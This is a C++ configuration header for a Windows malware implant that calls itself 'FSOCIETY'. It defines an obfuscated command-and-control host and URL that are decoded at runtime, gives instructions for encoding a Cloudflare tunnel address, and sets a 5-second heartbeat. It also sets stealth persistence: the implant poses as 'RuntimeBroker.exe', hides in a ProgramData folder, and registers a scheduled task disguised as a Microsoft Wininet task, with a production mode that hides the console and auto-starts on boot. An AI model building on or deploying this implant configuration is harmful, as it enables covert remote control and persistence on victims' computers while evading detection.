#pragma once

// ============================================================
// FSOCIETY C++ IMPLANT — CONFIGURATION
// ============================================================

#include "obf_decode.h"

// --- OPERATIONAL MODE ---
// true  = Safe: shows console, no persistence, no masquerade
// false = Production: hidden, persistent, auto-start on boot
#define TEST_MODE true

// --- C2 Server (Obfuscated — use obfuscator.py to generate bytes) ---
// Run: python obfuscator.py "your-c2-server.trycloudflare.com"
// Then paste the bytes() output below
//
// Example (placeholder — replace with your own):
//   _C2_HOST_ENC = { 0x00 };
//   Decoded at runtime by obf::decode()

static const std::vector<uint8_t> _C2_HOST_ENC = { 0x00 }; // PASTE_YOUR_BYTES_HERE
static const std::vector<uint8_t> _C2_URL_ENC  = { 0x00 }; // PASTE_YOUR_BYTES_HERE (full https://... URL)

// Runtime-decoded C2 values (initialized once in main)
inline std::wstring& c2_host_w() {
    static std::wstring host = obf::decode_wide(_C2_HOST_ENC);
    return host;
}
inline std::string& c2_host_a() {
    static std::string url = obf::decode(_C2_URL_ENC);
    return url;
}

// Macros for backward compatibility with existing code
#define C2_HOST       c2_host_w().c_str()
#define C2_PORT       443
#define C2_HOST_A     c2_host_a().c_str()

// --- OPSEC: Discord Webhook removed from implant ---
// Webhook is now stored ONLY on C2 server (webhook proxy)

// --- Timing ---
#define HEARTBEAT_MS  5000

// --- Persistence (only when TEST_MODE = false) ---
#define FAKE_EXE_NAME "RuntimeBroker.exe"
#define HIDDEN_DIR    "C:\\ProgramData\\Windows NT"
#define TASK_NAME     "Microsoft\\Windows\\Wininet\\CacheTask"
